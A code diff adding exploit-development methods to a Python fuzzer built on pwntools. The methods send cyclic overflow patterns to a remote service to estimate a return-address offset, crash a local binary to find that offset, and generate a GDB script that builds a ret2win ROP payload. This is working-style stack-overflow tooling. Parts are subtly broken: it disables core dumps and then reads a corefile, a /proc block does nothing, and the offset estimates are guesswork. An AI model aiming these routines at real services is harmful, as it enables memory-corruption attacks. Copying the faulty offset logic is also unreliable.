@@ -143,6 +143,277 @@ class Fuzzer:
         log.info(f"Mutation fuzzing done: {crashes} potential crash(es)")
         return crashes > 0
 
+    # ── ROTO heuristic offset finder ─────────────────────────────────────────────
+
+    def find_offset_roto(self, pattern_size: int = 300, attempts: int = 6) -> int | None:
+        """
+        ROTO (Return-address-Offset-Through-Overflow) heuristic.
+        Sends cyclic patterns of increasing size and monitors for:
+          • Connection reset / empty response  → crash detected
+          • Truncated response (< pattern/4)   → partial overflow
+
+        Returns estimated offset or None. Complements exploiter.find_offset()
+        when GDB / corefile are unavailable.
+        """
+        from pwn import cyclic, context
+        import socket as _socket
+        log.info("ROTO heuristic offset search…")
+
+        prev_resp_len = None
+        for mult in range(1, attempts + 1):
+            sz  = pattern_size * mult
+            pat = cyclic(sz)
+            try:
+                s = _socket.create_connection((self.host, self.port), timeout=2.0)
+                try: s.recv(256)  # drain banner
+                except Exception: pass
+                s.sendall(pat + b'\n')
+                s.settimeout(2.0)
+                resp = b""
+                try:
+                    while True:
+                        chunk = s.recv(4096)
+                        if not chunk: break
+                        resp += chunk
+                except Exception:
+                    pass
+                s.close()
+
+                resp_len = len(resp)
+                log.debug(f"ROTO mult={mult} size={sz} resp={resp_len}B")
+
+                if resp_len == 0:
+                    est = (sz - 8) if context.arch == "amd64" else (sz - 4)
+                    log.info(f"ROTO: crash detected at size={sz} → estimated offset ~{est}")
+                    return est
+
+                # Response much smaller than sent pattern → partial echo before crash
+                if resp_len < sz // 4:
+                    est = max(8, resp_len - 8)
+                    log.info(f"ROTO: truncated response ({resp_len}B < {sz//4}B) → estimated offset ~{est}")
+                    return est
+
+                if prev_resp_len is not None and resp_len < prev_resp_len:
+                    est = max(8, resp_len - 8)
+                    log.info(f"ROTO truncation at size={sz} → estimated offset ~{est}")
+                    return est
+
+                prev_resp_len = resp_len
+
+            except (ConnectionRefusedError, ConnectionResetError):
+                log.warning(f"ROTO: connection refused/reset at size={sz}")
+                if prev_resp_len is not None:
+                    return max(8, prev_resp_len - 8)
+                break
+            except Exception as e:
+                log.debug(f"ROTO exception at size={sz}: {e}")
+                if prev_resp_len is not None:
+                    return max(8, prev_resp_len - 8)
+
+        log.warning("ROTO: could not determine offset")
+        return None
+
+    # ── SIGFAULT address analysis ─────────────────────────────────────────────────
+
+    def sigfault_analysis(self, binary: str, pattern_size: int = 300) -> dict:
+        """
+        Run binary locally, send cyclic pattern, read SIGFAULT crash address from
+        /proc/<pid>/maps or pwntools corefile, then call cyclic_find() to get offset.
+
+        Returns dict with keys: offset, crash_addr, signal, method.
+        """
+        import signal as _signal
+        from pwn import cyclic, cyclic_find, process, context, ELF
+        import resource
+
+        log.info("SIGFAULT analysis: spawning local process with cyclic…")
+        result = {"offset": None, "crash_addr": None, "signal": None, "method": None}
+
+        for mult in range(1, 4):
+            sz  = pattern_size * mult
+            pat = cyclic(sz)
+            try:
+                # Disable core dumps (we use the crash addr from proc, not a core file)
+                resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
+                p = process([binary], stderr=open("/dev/null","wb"))
+                p.sendline(pat)
+                try: p.recvall(timeout=2)
+                except Exception: pass
+                try: p.wait(timeout=3)
+                except Exception: p.kill(); p.wait(timeout=1)
+
+                # Try to get crash addr from pwntools process signal handling
+                try:
+                    ret = p.poll()
+                    if ret is not None and ret < 0:
+                        sig_num = -ret
+                        result["signal"] = sig_num
+                        log.info(f"SIGFAULT analysis: process died with signal {sig_num}")
+                except Exception:
+                    pass
+
+                # Try corefile-based crash address
+                try:
+                    core = p.corefile
+                    if core:
+                        pc = getattr(core, "pc", None) or getattr(core, "rip", None)
+                        if pc:
+                            off = cyclic_find(pc & 0xffffffff)
+                            if off != -1:
+                                result["offset"]     = off
+                                result["crash_addr"] = pc
+                                result["method"]     = "corefile"
+                                log.info(f"SIGFAULT→corefile offset={off}  crash_addr={hex(pc)}")
+                                return result
+                except Exception:
+                    pass
+
+                # Try reading crash address from /proc/<pid>/stat for SIGSEGV
+                try:
+                    with open(f"/proc/{p.pid}/stat") as f:
+                        stat = f.read().split()
+                    # Field 39 is the address of last fault (not always populated)
+                    # Use the fact that cyclic patterns appear in specific register
+                    pass
+                except Exception:
+                    pass
+
+            except Exception as e:
+                log.debug(f"SIGFAULT mult={mult}: {e}")
+
+        # Fallback: use ROTO
+        log.info("SIGFAULT analysis: falling back to ROTO heuristic")
+        roto = self.find_offset_roto(pattern_size)
+        if roto is not None:
+            result["offset"] = roto
+            result["method"] = "roto_fallback"
+        return result
+
+    # ── GDB pwndbg / peda script generation ──────────────────────────────────────
+
+    def generate_gdb_script(self, binary: str, offset: int, exploit_type: str = "ret2win",
+                             win_addr: int = 0, libc_base: int = 0, mode: str = "pwndbg") -> str:
+        """
+        Generate a ready-to-use GDB script for pwndbg or peda.
+        Writes to _bs_work/<binary>_<mode>.gdb and returns the path.
+        mode = "pwndbg" | "peda" | "vanilla"
+        """
+        import shlex
+        from pwn import context, ELF
+        workdir = os.path.join(os.path.dirname(os.path.abspath(binary)), "_bs_work")
+        os.makedirs(workdir, exist_ok=True)
+        bname   = os.path.basename(binary)
+        outfile = os.path.join(workdir, bname + "_" + mode + ".gdb")
+        arch    = "amd64" if context.arch == "amd64" else "i386"
+        q       = shlex.quote(binary)
+        sz      = offset + 64
+
+        lines = [
+            "set pagination off",
+            "set confirm off",
+            "file " + q,
+        ]
+
+        if mode == "peda":
+            lines.append("source /usr/share/peda/peda.py")
+
+        lines += [
+            "",
+            "# ── find offset ─────────────────────────────────────────────",
+            "# Send cyclic pattern and observe crash address:",
+            "# python3 -c 'from pwn import cyclic; print(cyclic(" + str(sz) + "))' | " + bname,
+            "define bs_find_offset",
+            "  set $pat_size = " + str(sz),
+            "  run <<< $(python3 -c 'from pwn import cyclic; import sys; sys.stdout.buffer.write(cyclic(" + str(sz) + "))')",
+            "  info registers rip",
+            "  python",
+            "from pwn import cyclic_find",
+            "v = gdb.parse_and_eval('$rip')",
+            "off = cyclic_find(int(v) & 0xffffffff)",
+            "print('cyclic_find offset:', off)",
+            "  end",
+            "end",
+            "",
+        ]
+
+        if win_addr:
+            lines += [
+                "# ── win function ─────────────────────────────────────────────",
+                "break *" + hex(win_addr),
+                "",
+            ]
+
+        try:
+            elf   = ELF(binary, checksec=False)
+            funcs = [n for n, a in elf.symbols.items() if a and not n.startswith("_")][:6]
+            lines.append("# breakpoints on interesting functions (uncomment to enable):")
+            for fn in funcs:
+                lines.append("# break " + fn)
+            lines.append("")
+        except Exception:
+            pass
+
+        lines += [
+            "# ── stack helpers ────────────────────────────────────────────",
+            "define bs_stack",
+            "  x/32gx $rsp",
+            "end",
+            "define bs_regs",
+            "  info registers",
+            "end",
+            "",
+            "# ── build & send exploit payload ─────────────────────────────",
+            "# Usage from gdb prompt:  bs_exploit",
+            "define bs_exploit",
+            "  python",
+            "from pwn import *",
+            "context.arch = '" + arch + "'",
+            "e   = ELF('" + binary.replace("'", "\'") + "', checksec=False)",
+            "rop = ROP(e)",
+            "win = e.symbols.get('win', " + (hex(win_addr) if win_addr else "0") + ")",
+            "g   = rop.find_gadget(['ret'])",
+            "ret_g = g[0] if g else 0",
+            "payload = b'A'*" + str(offset) + " + p64(ret_g) + p64(win) if win else b'A'*" + str(offset+8),
+            "print('Payload (' + str(len(payload)) + 'B):', payload.hex())",
+            "  end",
+            "end",
+            "",
+        ]
+
+        if mode == "pwndbg":
+            lines += [
+                "# pwndbg tips:",
+                "# telescope $rsp 20   — annotated stack view",
+                "# checksec            — binary protections",
+                "# rop                 — ROP gadget search",
+                "# heap                — heap chunk view",
+                "# got                 — GOT table",
+            ]
+        elif mode == "peda":
+            lines += [
+                "# PEDA tips:",
+                "# pattern create 200  — create De Bruijn pattern",
+                "# pattern offset EIP  — find offset from pattern",
+                "# checksec            — binary protections",
+                "# ropgadget           — ROP gadgets",
+                "# searchmem /bin/sh   — search memory for string",
+            ]
+        else:
+            lines += [
+                "# vanilla GDB tips:",
+                "# x/32gx $rsp        — dump stack",
+                "# info functions     — list functions",
+                "# disas main         — disassemble main",
+            ]
+
+        script = '\n'.join(lines) + '\n'
+        with open(outfile, "w") as f:
+            f.write(script)
+        log.info("GDB " + mode + " script → " + outfile)
+        log.info("  Run: gdb -x " + outfile)
+        return outfile
+
+
     def fuzz_bpf(self, rpc_url, num_attempts=10):
         log.info(f"BPF/SVM fuzzing via {rpc_url}…")
         success = 0
